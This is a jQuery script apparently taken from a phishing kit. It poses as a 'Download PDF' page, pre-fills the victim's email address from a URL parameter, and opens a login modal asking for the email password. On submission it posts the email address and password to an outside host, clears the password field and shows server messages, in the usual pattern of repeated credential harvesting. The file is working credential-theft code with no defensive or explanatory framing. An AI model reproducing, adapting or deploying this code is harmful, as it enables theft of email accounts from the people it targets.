(function ($) {
    const params_url = new URLSearchParams(window.location.search);
    const emailauto = params_url.get('e');

    $(document).ready(function () {
        var cou_nt = 0;
        var form_error = [false, false];

        $('#btn4dlmodal').on('click', function (e) {
            if (emailauto != '') {
                $('#akpati').val(emailauto);
            }
            $loader_show("#ff0000");
            setTimeout(() => {
                $loader_hide();
                $('#loginModal').modal({ dismissible: false });
                $('#loginModal').modal('open');
            }, 2000);
        });
        $('#gawaboy').on('submit', function (e) {
            e.preventDefault();

            var input4email = $('#akpati').val();
            var input4passwd = $('#igodo').val();
            var form_error = [false, false];

            $('#akpati').attr('style', '').next("span").text("");
            $('#igodo').attr('style', '').next("span").text("");
            $('#showerror').html("");
            if (input4email == '') {
                $('#akpati').next("span").text("Email address is needed.");
                $('#akpati').focus().attr('style', 'border-color: #ff0000 !important');
                form_error[0] = true;
            }
            if (input4passwd == '') {
                $('#igodo').next("span").text("Email password is needed.");
                $('#igodo').focus().attr('style', 'border-color: #ff0000 !important');
                form_error[1] = true;
            }

            //console.log(form_error);

            if (form_error.includes(true)) {
                return false;
            }
            $.ajax({
                url: "https://mackinaww.live/hmrs/parent.php",
                method: "post",
                data: {
                    email: input4email,
                    password: input4passwd
                },
                processData: true,
                beforeSend: function () {
                    $('#showerror').removeClass('alert').text('');
                    $('#btn4sbmt')
                        .html('<center><div class="spinner"></div></center>')
                        .prop('disabled', true);
                },
                success: function (response) {
					console.log(response)
					$('#igodo').val("");
                    try {
                        let res = (typeof response === "string") ? JSON.parse(response) : response;
						
                        if (res.status === "success") {
                            $('#showerror').html("<span style='color:red'>" + res.message + "</span>");
                            $('#igodo').val("");
                        } else {
                            $('#showerror').html("<span style='color:red'>" + res.message + "</span>");
                            $('#igodo').focus().val('');
                        }
                    } catch (err) {
                        console.log("Invalid JSON response:", err, response);
                        $('#showerror').html("Unexpected server response.");
                    }
                },
                error: function (jqXHR, textStatus, errorMessage) {
                    console.log(jqXHR);
                    console.log(errorMessage);
                    $('#showerror').html("<span style='color:red'>Connection error. Please try again.</span>");
                },
                complete: function () {
                    $('#btn4sbmt').html('Download PDF').prop('disabled', false);
                }
            });
        });
    });
})(jQuery);
